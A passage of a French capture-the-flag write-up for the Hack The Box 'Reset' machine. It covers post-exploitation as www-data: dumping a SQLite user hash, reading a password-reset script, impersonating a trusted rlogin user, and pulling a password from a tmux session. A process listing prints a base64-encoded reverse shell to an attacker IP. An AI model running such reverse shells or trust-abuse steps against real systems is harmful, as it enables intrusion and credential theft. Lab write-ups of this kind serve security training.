+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4974</span> <span class="n">Dec</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xrwx</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Jul</span> <span class="mi">19</span> <span class="mi">13</span><span class="p">:</span><span class="mi">45</span> <span class="n">private_34eee5d2</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1154</span> <span class="n">Dec</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="n">reset_password</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">remote</span><span class="p">)</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">reset</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">cd</span> <span class="n">private_34eee5d2</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">remote</span><span class="p">)</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">reset</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">private_34eee5d2</span><span class="o">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">24</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xrwx</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Jul</span> <span class="mi">19</span> <span class="mi">13</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">7</span>  <span class="mi">2024</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">16384</span> <span class="n">Jul</span> <span class="mi">19</span> <span class="mi">13</span><span class="p">:</span><span class="mi">45</span> <span class="n">db</span><span class="o">.</span><span class="n">sqlite</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">remote</span><span class="p">)</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">reset</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">private_34eee5d2</span><span class="o">$</span> <span class="n">sqlite3</span> <span class="n">db</span><span class="o">.</span><span class="n">sqlite</span>
+</span></span><span class="line"><span class="cl"><span class="n">SQLite</span> <span class="n">version</span> <span class="mf">3.37</span><span class="o">.</span><span class="mi">2</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">06</span> <span class="mi">13</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">41</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="s2">&#34;.help&#34;</span> <span class="k">for</span> <span class="n">usage</span> <span class="n">hints</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">sqlite</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">tables</span>
+</span></span><span class="line"><span class="cl"><span class="n">users</span>
+</span></span><span class="line"><span class="cl"><span class="n">sqlite</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">users</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="o">|</span><span class="n">admin</span><span class="o">|</span><span class="mi">083</span><span class="n">c4be00a45b3797d80f79c77c620bbd01dd41a</span><span class="o">|</span><span class="mi">1</span></span></span></code></pre></div></div>
+<p>Je vois le code de la fonctionnalité de changement de mot de passe. Le code vérifie que l&rsquo;utilisateur entré existe. S&rsquo;il existe il génère une combinaison de 8 caractères qu&rsquo;il hash ensuite en sha1. Il met ensuite à jour la base de données puis renvoi à la fin du JSON contenant la les nouveaux paramètres.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-php">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">(</span><span class="nx">remote</span><span class="p">)</span> <span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">reset</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">reset_password</span><span class="o">.</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span><span class="p">(</span><span class="s1">&#39;private_34eee5d2/db.sqlite&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM users WHERE username = :username&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">&#39;:username&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nx">SQLITE3_TEXT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">(</span><span class="nx">SQLITE3_ASSOC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$newPassword</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">random_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">));</span> <span class="c1">// Generate 8-character password
+</span></span></span><span class="line"><span class="cl">        <span class="nv">$hashedPassword</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$newPassword</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$updateStmt</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">&#39;UPDATE users SET password_hash = :password_hash WHERE username = :username&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$updateStmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">&#39;:password_hash&#39;</span><span class="p">,</span> <span class="nv">$hashedPassword</span><span class="p">,</span> <span class="nx">SQLITE3_TEXT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$updateStmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">&#39;:username&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nx">SQLITE3_TEXT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$updateStmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;new_password&#39;</span> <span class="o">=&gt;</span> <span class="nv">$newPassword</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;timestamp&#39;</span> <span class="o">=&gt;</span> <span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span><span class="s1">&#39;error&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;User not found&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span><span class="s1">&#39;error&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Invalid request&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></div>
+<p>Je vois qu&rsquo;il existe 3 utilisateurs sur la machine. Je me rends alors dans le répertoire personnel de <code>sadm</code>. Je peux alors obtenir le flag user.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@reset:/var/www/html$ cat /etc/passwd <span class="p">|</span> grep sh
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">local:x:1000:1000:local:/home/local:/bin/bash
+</span></span><span class="line"><span class="cl">sadm:x:1001:1001:,,,:/home/sadm:/bin/bash
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@reset:/home$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> root  root  <span class="m">4096</span> Jun  <span class="m">2</span> 11:34 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root  root  <span class="m">4096</span> Jun  <span class="m">4</span> 14:57 ..
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">5</span> <span class="nb">local</span> <span class="nb">local</span> <span class="m">4096</span> Jun  <span class="m">2</span> 11:34 <span class="nb">local</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> sadm  sadm  <span class="m">4096</span> Jun  <span class="m">4</span> 14:57 sadm
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@reset:/home$ <span class="nb">cd</span> sadm
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@reset:/home/sadm$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">36</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> sadm sadm <span class="m">4096</span> Jun  <span class="m">4</span> 14:57 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Jun  <span class="m">2</span> 11:34 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> sadm sadm    <span class="m">9</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> sadm sadm  <span class="m">220</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> sadm sadm <span class="m">3771</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> sadm sadm <span class="m">4096</span> Jun  <span class="m">2</span> 11:34 .cache
+</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">3</span> sadm sadm <span class="m">4096</span> Jun  <span class="m">2</span> 11:34 .local
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> sadm sadm  <span class="m">807</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .profile
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> sadm sadm    <span class="m">7</span> Dec  <span class="m">6</span>  <span class="m">2024</span> .rhosts
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">33</span> Apr <span class="m">10</span> 09:45 user.txt
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@reset:/home/sadm$ cat user.txt
+</span></span><span class="line"><span class="cl">19ba954c8ba8400cbfc0277f5f1669a4</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-sadm">Shell en tant que sadm</h2>
+<h3 id="tmux">tmux</h3>
+<p>Après ça je me suis mis à fouiller un peu partout sur la machine. j&rsquo;ai regardé les SUID, les logs, les fichiers appartenant aux utilisateurs <code>www-data</code> et <code>sadm</code>. Puis en regardant les processus, je vois que <code>sadm</code> a lancé une session <code>tmux</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(remote) www-data@reset:/home/sadm$ ps -ef --forest
+</span></span><span class="line"><span class="cl">UID          PID    PPID  C STIME TTY          TIME CMD
+</span></span><span class="line"><span class="cl">root           2       0  0 13:41 ?        00:00:00 [kthreadd]
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">root        1222       1  0 13:41 ?        00:00:00 /usr/sbin/apache2 -k start
+</span></span><span class="line"><span class="cl">www-data    1238    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+</span></span><span class="line"><span class="cl">www-data    1842    1238  0 14:16 ?        00:00:00  |   \_ sh -c echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYxCg==|base64 -d|bash
+</span></span><span class="line"><span class="cl">www-data    1845    1842  0 14:16 ?        00:00:00  |       \_ bash
+</span></span><span class="line"><span class="cl">www-data    1846    1845  0 14:16 ?        00:00:00  |           \_ /usr/bin/bash
+</span></span><span class="line"><span class="cl">www-data    1866    1846  0 14:16 ?        00:00:00  |               \_ /usr/bin/script -qc /usr/bin/bash /dev/null
+</span></span><span class="line"><span class="cl">www-data    1867    1866  0 14:16 pts/0    00:00:00  |                   \_ sh -c /usr/bin/bash
+</span></span><span class="line"><span class="cl">www-data    1868    1867  0 14:16 pts/0    00:00:00  |                       \_ /usr/bin/bash
+</span></span><span class="line"><span class="cl">www-data    2704    1868  0 15:10 pts/0    00:00:00  |                           \_ ps -ef --forest
+</span></span><span class="line"><span class="cl">www-data    1239    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+</span></span><span class="line"><span class="cl">www-data    1240    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+</span></span><span class="line"><span class="cl">www-data    1241    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+</span></span><span class="line"><span class="cl">www-data    1242    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+</span></span><span class="line"><span class="cl">www-data    1375    1222  0 13:44 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+</span></span><span class="line"><span class="cl">www-data    2437    1222  0 14:58 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+</span></span><span class="line"><span class="cl">sadm        1232       1  0 13:41 ?        00:00:00 tmux new-session -d -s sadm_session
+</span></span><span class="line"><span class="cl">sadm        1234    1232  0 13:41 pts/3    00:00:00  \_ -bash</span></span></code></pre></div></div>
+<p>J&rsquo;ai essayé de m&rsquo;y attaché mais cela n&rsquo;a pas fonctionné. La j&rsquo;étais bloqué.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(remote) www-data@reset:/home/sadm$ tmux attach-session -t sadm_session
+</span></span><span class="line"><span class="cl">no sessions</span></span></code></pre></div></div>
+<h3 id="rlogin">Rlogin</h3>
+<p>Puis je suis retourné sur le résultat du scan Nmap. Il doit surement avoir quelque chose à faire avec le service <code>Rlogin</code>. Une petite recherche sur le site de <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rlogin.html" target="_blank" rel="noopener noreffer ">hacktricks</a> sur le pentest de <code>rlogin</code>. Je trouve aussi sur <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rsh.html" target="_blank" rel="noopener noreffer ">hacktricks</a> que le fichier <code>/etc/hosts.equiv</code> contient les utilisateurs autorisés à se connecter à <code>rlogin</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv
+</span></span><span class="line"><span class="cl"># /etc/hosts.equiv: list  of  hosts  and  users  that are granted &#34;trusted&#34; r
+</span></span><span class="line"><span class="cl">#                   command access to your system .
+</span></span><span class="line"><span class="cl">- root
+</span></span><span class="line"><span class="cl">- local
+</span></span><span class="line"><span class="cl">+ sadm
+</span></span><span class="line"><span class="cl">(remote) www-data@reset:/home/sadm$</span></span></code></pre></div></div>
+<p>Je vois que <code>rlogin</code> est déjà installé sur la machine. L&rsquo;utilisateur autorisé à se connecter est <code>sadm</code>, mais je n&rsquo;ai pas réussi à m&rsquo;y connecter.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(remote) www-data@reset:/home/sadm$ rlogin -l sadm 127.0.0.1
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Login incorrect
+</span></span><span class="line"><span class="cl">reset login: toto
+</span></span><span class="line"><span class="cl">Password:</span></span></code></pre></div></div>
+<p>Là j&rsquo;étais de nouveaux bloqué. Je décide alors de regarder le writeup de <a href="https://0xdf.gitlab.io/2025/07/15/htb-reset.html" target="_blank" rel="noopener noreffer ">0xdf</a>. Je vois alors qu&rsquo;il est possible de l&rsquo;exploiter depuis ma machine. Il suffit pour cela, comme vu sur <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rlogin.html" target="_blank" rel="noopener noreffer ">hacktricks</a>, d&rsquo;installer <code>rsh-client</code>, ensuite de créer un utilisateur avec le même nom que celui autorisé à pouvoir se connecter avec <code>rlogin</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Reset
+</span></span><span class="line"><span class="cl">╰─➤  apt-get install rsh-client
+</span></span><span class="line"><span class="cl">Reading package lists... Done
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Reset
+</span></span><span class="line"><span class="cl">╰─➤  useradd sadm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Reset
+</span></span><span class="line"><span class="cl">╰─➤  passwd sadm
+</span></span><span class="line"><span class="cl">New password:
+</span></span><span class="line"><span class="cl">Retype new password:
+</span></span><span class="line"><span class="cl">passwd: password updated successfully</span></span></code></pre></div></div>
+<p>Ensuite je me connecte en tant que <code>sadm</code> sur ma machine. Puis je lance la commande <code>rlogin</code> avec l&rsquo;adresse IP de la machine cible. Et voila que je suis connecté en tant que <code>sadm</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Reset
+</span></span><span class="line"><span class="cl">╰─➤  su - sadm
+</span></span><span class="line"><span class="cl">su: warning: cannot change directory to /home/sadm: No such file or directory
+</span></span><span class="line"><span class="cl">$ rlogin 10.129.183.12
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.5 LTS <span class="o">(</span>GNU/Linux 5.15.0-140-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sadm@reset:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sadm<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sadm<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>sadm<span class="o">)</span></span></span></code></pre></div></div>
+<p>Je m&rsquo;attache ensuite à la session <code>tmux</code> trouvée lors de l&rsquo;énumération des processus. S&rsquo;y trouve le mot de passe <code>7lE2PAfVHfjz4HpE</code> de <code>sadm</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sadm@reset:~$ tmux ls
+</span></span><span class="line"><span class="cl">sadm_session: <span class="m">1</span> windows <span class="o">(</span>created Sat Jul <span class="m">19</span> 13:41:18 2025<span class="o">)</span>
+</span></span><span class="line"><span class="cl">sadm@reset:~$ tmux attach-session -t sadm_session</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Reset/Reset-16.png"
+        data-srcset="/images/Reset/Reset-16.png, /images/Reset/Reset-16.png 1.5x, /images/Reset/Reset-16.png 2x"
+        data-sizes="auto"
+        alt="/images/Reset/Reset-16.png"
+        title="/images/Reset/Reset-16.png" width="896" height="116" /></p>
+<p>Je me connecte alors par SSH avec les identifiants trouvés.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">╭─</span><span class="n">root</span><span class="err">@</span><span class="n">exegol</span><span class="o">-</span><span class="n">hackthebox</span> <span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">Reset</span>
+</span></span><span class="line"><span class="cl"><span class="err">╰─➤</span>  <span class="n">ssh</span> <span class="n">sadm</span><span class="err">@</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">183.12</span>
+</span></span><span class="line"><span class="cl"><span class="n">sadm</span><span class="err">@</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">183.12</span><span class="s1">&#39;s password:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04</span><span class="o">.</span><span class="mi">5</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">140</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"> <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl"> <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">pro</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">System</span> <span class="n">information</span> <span class="n">as</span> <span class="n">of</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">19</span> <span class="mi">03</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">20</span> <span class="n">PM</span> <span class="n">UTC</span> <span class="mi">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">System</span> <span class="nb">load</span><span class="p">:</span>           <span class="mf">0.0</span>
